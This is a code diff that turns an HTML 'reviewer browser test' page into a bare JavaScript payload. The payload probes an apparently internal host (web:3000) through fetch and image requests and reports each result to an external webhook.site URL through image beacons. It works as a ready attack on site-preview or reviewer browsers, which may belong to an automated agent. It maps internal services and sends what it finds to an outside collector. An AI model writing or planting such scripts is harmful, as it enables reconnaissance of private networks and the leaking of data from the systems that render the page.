@@ -1,30 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SitePreview Reviewer Test</title>
-</head>
-<body>
-  <h1>Reviewer Browser Test</h1>
-  <p>Testing JavaScript execution.</p>
+<script>
+const webhook =
+  "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
 
-  <script>
-    const webhook =
-      "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
+function report(name, value) {
+  const params = new URLSearchParams({
+    event: name,
+    value: String(value),
+    time: new Date().toISOString()
+  });
+  new Image().src = webhook + "?" + params;
+}
 
-    const params = new URLSearchParams({
-      event: "javascript-executed",
-      origin: location.origin,
-      ua: navigator.userAgent,
-      time: new Date().toISOString()
-    });
+report("js-started", location.origin);
 
-    const beacon = new Image();
-    beacon.src = webhook + "?" + params.toString();
+fetch("http://web:3000/", {
+  mode: "cors",
+  credentials: "omit"
+})
+.then(async response => {
+  report("internal-fetch", response.status);
+})
+.catch(error => {
+  report("internal-fetch-error", error.name);
+});
 
-    document.body.append(
-      "JavaScript executed successfully."
-    );
-  </script>
-</body>
-</html>
+const img = new Image();
+img.onload = () => report("internal-image", "loaded");
+img.onerror = () => report("internal-image", "failed");
+img.src = "http://web:3000/favicon.ico";
+</script>
